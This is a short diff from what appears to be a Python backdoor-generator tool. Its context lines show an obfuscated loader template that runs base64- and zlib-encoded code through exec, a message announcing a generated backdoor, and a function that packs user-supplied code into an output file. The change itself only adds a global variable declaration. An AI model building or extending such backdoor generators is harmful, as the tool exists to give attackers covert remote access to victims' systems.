@@ -281,7 +281,9 @@ exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
         print('(*) Generated Backdoor and saved as '+name)
 def gen_custom():
     customshell=input("Please enter the file name containing your code: ")
+    global name
     name="ocr"
+   
 
     with open(customshell, 'r') as cuso:
         with open(name, 'a+') as ina:
